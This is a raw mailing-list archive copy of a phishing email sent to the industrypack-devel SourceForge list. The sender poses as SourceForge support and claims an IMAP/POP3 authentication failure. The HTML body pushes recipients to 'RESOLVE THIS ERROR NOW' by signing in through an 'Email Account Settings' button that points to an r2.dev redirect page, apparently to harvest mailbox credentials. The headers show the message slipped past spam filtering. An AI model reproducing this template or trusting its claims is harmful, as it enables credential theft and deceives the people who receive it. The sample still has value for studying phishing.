Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 42C4D95113F
	for <lists+industrypack-devel@lfdr.de>; Wed, 14 Aug 2024 02:56:24 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1se2JL-00055Y-Lo
	for lists+industrypack-devel@lfdr.de;
	Wed, 14 Aug 2024 00:56:23 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@gtscvnn.com>) id 1se2JJ-00055Q-Q2
 for industrypack-devel@lists.sourceforge.net;
 Wed, 14 Aug 2024 00:56:21 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=0SD+VJBWZTkMDhhf0Bw0E5WfU+IovoUgI8laSI7muic=; b=MZfhlt6yxXjHTODY4hQeaLYiM8
 loWOxLVRRXIbl8yWfOa74aa/9f/kKQTZAlqG3HdSgESAsWiel+2TdZ+8VoU3YsRqAl2uzGTOJSucS
 RuXcR2KlO9/grjG0NvZLWrDQB0eg1HG6YIAXz0NM7uB0VWppZjPTbwNA3SkO+NDZHxI4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=0SD+VJBWZTkMDhhf0Bw0E5WfU+IovoUgI8laSI7muic=; b=K
 jSjNwQZCw3t90NbHUJFiLGPfbyiGCCjpPa/64prgRSjxkYvHoMCIvLgww4f7HATMT3O+N4i8v6qAe
 xB1/uhxdJv5TVNdId0HGGcpnUgpU1JUbKtA2PXFKhUJHHs3jBlZwynbINBBwPAJ2e0IRuheiI6gpp
 hO1pk0RYY7KdpG4g=;
Received: from server.gtscvnn.com ([37.221.67.180] helo=gtscvnn.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1se2JH-0007uF-L4 for industrypack-devel@lists.sourceforge.net;
 Wed, 14 Aug 2024 00:56:21 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=gtscvnn.com
 ; s=mail;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
 Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
 In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=0SD+VJBWZTkMDhhf0Bw0E5WfU+IovoUgI8laSI7muic=; b=NBSxicouCOdTdfarthFIqdYcPl
 Qu3oCxSSXp6IRnyxkrcWpdn4rCKywEjNvd8DDAAL4XMrpnSuzk1I282OYEmhk0dM374WJ1YkAiRW7
 Toc2zi9to8vvQ1KGOQyo7lPC2dDYHvbQAhaJv3mTvKoIWPO+yuuiZnx5zZL7WMAaGdT0=;
Received: from [46.183.220.47] (helo=ip-220-47.dataclub.info)
 by gtscvnn.com with esmtpsa (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 (Exim 4.93) (envelope-from <admin@gtscvnn.com>) id 1sdjU9-00040g-Hp
 for industrypack-devel@lists.sourceforge.net; Tue, 13 Aug 2024 07:50:18 +0300
From: Supportlists.sourceforge.net<admin@gtscvnn.com>
To: industrypack-devel@lists.sourceforge.net
Date: 13 Aug 2024 07:50:09 +0300
Message-ID: <20240813075009.EF0CF61721297D3C@gtscvnn.com>
MIME-Version: 1.0
X-Helo-Check: bad, Forged Random Domain (gtscvnn.com)
X-Spam-Score: 5.8 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Authentication failure for
 industrypack-devel@lists.sourceforge.net
 Attention: industrypack-devel, Error with your IMAP/POP3 mails server. RESOLVE
 THIS ERROR NOW 
 Content analysis details:   (5.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: r2.dev]
 0.5 FROM_DOMAIN_NOVOWEL    From: domain has series of non-vowel letters
 0.3 RCVD_IN_MSPIKE_L3      RBL: Low reputation (-3)
 [37.221.67.180 listed in bl.mailspike.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
X-Headers-End: 1se2JH-0007uF-L4
Subject: [Industrypack-devel] Authentication failure, Resolve  TheError now!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1982268111385696849=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============1982268111385696849==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19650">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"640" style=3D'text-align: left; color: rgb(0, 0, 0); text-t=
ransform: none; letter-spacing: normal; font-family: "Segoe UI", "Lucida Sa=
ns", sans-serif; font-size: medium; font-style: normal; font-weight: 400; w=
ord-spacing: 0px; border-right-color: rgb(227, 227, 227); border-left-color=
: rgb(227, 227, 227); border-right-width: 1px; border-left-width: 1px; bord=
er-right-style: solid; border-left-style: solid; white-space: normal; borde=
r-collapse: collapse; box-sizing: border-box;=20
orphans: 2; widows: 2; background-color: rgb(252, 253, 254); font-variant-l=
igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
; text-decoration-thickness: initial; text-decoration-style: initial; text-=
decoration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-=
box; background-color: rgb(0, 114, 198);">
<td width=3D"310" valign=3D"middle" style=3D"padding: 12px 0px; border-top-=
color: rgb(227, 227, 227); border-bottom-color: rgb(227, 227, 227); border-=
top-width: 1px; border-bottom-width: 1px; border-top-style: solid; border-b=
ottom-style: solid; box-sizing: border-box;"><h1 align=3D"center" style=3D'=
color: rgb(255, 255, 255); line-height: 20pt; font-family: "segoe ui light"=
; font-size: 15pt; font-weight: normal; margin-top: 0px; margin-bottom: 0.5=
rem; box-sizing: border-box;'>
<span style=3D"box-sizing: border-box;"></span>&nbsp;<font size=3D"5" style=
=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; box-sizi=
ng: border-box;"><span>&nbsp;</span>Authentication failure for&nbsp;industr=
ypack-devel@lists.sourceforge.net</strong></font></h1></td><td width=3D"24"=
 style=3D"border-top-color: rgb(227, 227, 227); border-bottom-color: rgb(22=
7, 227, 227); border-top-width: 1px; border-bottom-width: 1px; border-top-s=
tyle: solid; border-bottom-style: solid; box-sizing: border-box;">&nbsp;</t=
d></tr></tbody>
</table>
<table width=3D"640" style=3D'text-align: left; color: rgb(0, 0, 0); text-t=
ransform: none; letter-spacing: normal; font-family: "Segoe UI", "Lucida Sa=
ns", sans-serif; font-size: medium; font-style: normal; font-weight: 400; w=
ord-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizin=
g: border-box; orphans: 2; widows: 2; background-color: rgb(252, 253, 254);=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-b=
ox;"><tr style=3D"box-sizing: border-box;"><td width=3D"1" style=3D"backgro=
und: rgb(227, 227, 227); box-sizing: border-box;"></td><td width=3D"24" sty=
le=3D"box-sizing: border-box;">&nbsp;</td>
<td width=3D"640" valign=3D"top" style=3D"padding: 10px 0px 20px; border-bo=
ttom-color: rgb(227, 227, 227); border-bottom-width: 1px; border-bottom-sty=
le: solid; box-sizing: border-box;" colspan=3D"2"><table style=3D"border-co=
llapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" c=
ellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-=
sizing: border-box;"><td width=3D"630" style=3D"color: rgb(0, 0, 0); line-h=
eight: 13pt; font-size: 10pt; box-sizing: border-box;">
<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"bo=
x-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"b=
ox-sizing: border-box;"><div align=3D"left" style=3D'color: rgb(51, 51, 51)=
; font-family: "segoe ui", tahoma, sans-serif; font-size: 14px; box-sizing:=
 border-box;'><span style=3D"box-sizing: border-box;">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Att=
ention:<span>&nbsp;</span><strong style=3D"font-weight: bolder; box-sizing:=
 border-box;">industrypack-devel</strong>,</span></div>
<div align=3D"left" style=3D'color: rgb(51, 51, 51); font-family: "segoe ui=
", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span styl=
e=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span>=
</div><div align=3D"center" style=3D'color: rgb(51, 51, 51); font-family: "=
segoe ui", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><s=
pan style=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box=
;"><span style=3D"box-sizing: border-box;">
<font color=3D"#ec1330" style=3D"box-sizing: border-box;"><strong style=3D"=
font-weight: bolder; box-sizing: border-box;">Error with your IMAP/POP3 mai=
ls server.</strong></font>&nbsp;<br style=3D"box-sizing: border-box;"><span=
 style=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; bo=
x-sizing: border-box;"><br style=3D"box-sizing: border-box;"></strong></spa=
n></span></span></span></div>
<div align=3D"center" style=3D'color: rgb(51, 51, 51); font-family: "segoe =
ui", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span st=
yle=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><sp=
an style=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;=
"><strong style=3D"font-weight: bolder; box-sizing: border-box;">RESOLVE TH=
IS ERROR NOW</strong></span></span></span></span></div>
<div align=3D"left" style=3D'color: rgb(51, 51, 51); font-family: "segoe ui=
", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span styl=
e=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; box-siz=
ing: border-box;">Note:</strong><span>&nbsp;</span>This will cause failure =
in outgoing and incoming mail delivery through your mail client.<br style=
=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span><=
/div>
<div align=3D"left" style=3D'color: rgb(51, 51, 51); font-family: "segoe ui=
", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span styl=
e=3D"box-sizing: border-box;">You are required to use the below link to sig=
n in to your email account for automatic update/repair.</span></div><br sty=
le=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></td><=
/tr><tr style=3D"box-sizing: border-box;"><td align=3D"center" style=3D"pad=
ding: 0px; box-sizing: border-box;">
<table align=3D"center" class=3D"v1m_-7257559470588763933auto-height" style=
=3D"border-collapse: collapse; box-sizing: border-box; background-color: rg=
b(0, 120, 215);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody st=
yle=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;">
<td align=3D"center" class=3D"v1m_-7257559470588763933font-size-18 v1m_-725=
7559470588763933line-height-24 v1m_-7257559470588763933padding-top-12 v1m_-=
7257559470588763933padding-right-24 v1m_-7257559470588763933padding-bottom-=
12 v1m_-7257559470588763933padding-left-24" style=3D'padding: 13px 24px; bo=
rder: 1px solid rgb(0, 120, 215); border-image: none; text-align: center; c=
olor: rgb(0, 120, 215); line-height: 10px; font-family: "segoe ui", "segoe =
wp", wf_segoe-ui_semibold, tahoma, arial, sans-serif;=20
font-size: 16px; font-weight: 600; box-sizing: border-box; background-color=
: rgb(0, 120, 215);'><span class=3D"v1Object" style=3D"color: rgb(68, 101, =
111); text-decoration: none; cursor: pointer; box-sizing: border-box;"><spa=
n class=3D"v1Object" style=3D"color: rgb(68, 101, 111); text-decoration: no=
ne; cursor: pointer; box-sizing: border-box;">
<a style=3D"color: rgb(255, 255, 255); text-decoration: none; cursor: point=
er; box-sizing: border-box; background-color: transparent;" href=3D"https:/=
/pub-3a2f963fd3804d46b902109f59b7e533.r2.dev/redirecting.html#industrypack-=
devel@lists.sourceforge.net" target=3D"_blank" rel=3D"noreferrer">Email Acc=
ount Settings</a></span></span></td></tr></tbody></table></td></tr></tbody>=
</table><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: bord=
er-box;">
<div style=3D'color: rgb(51, 51, 51); font-family: "segoe ui", tahoma, sans=
-serif; font-size: 14px; box-sizing: border-box;'>Sincerely,</div><div styl=
e=3D'color: rgb(51, 51, 51); font-family: "segoe ui", tahoma, sans-serif; f=
ont-size: 14px; font-style: italic; box-sizing: border-box;'>lists.sourcefo=
rge.net&nbsp;Automated IT Message!</div></td></tr></tbody></table></td></tr=
></tbody></table>
<p style=3D'text-align: left; color: rgb(51, 51, 51); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", "Segoe =
UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", Arial, "sans-serif"; =
font-size: 12px; font-style: normal; font-weight: 400; margin-top: 0px; mar=
gin-bottom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: borde=
r-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
riant-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;'>
<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: "Segoe UI", "Lucida Sans", sans-serif=
; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px;=
 float: none; display: inline !important; white-space: normal; box-sizing: =
border-box; orphans: 2; widows: 2; background-color: rgb(252, 253, 254); fo=
nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
e-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;'>&nbsp;&nbs=
p;&nbsp;&nbsp;</span></p></body></html>


--===============1982268111385696849==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1982268111385696849==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1982268111385696849==--
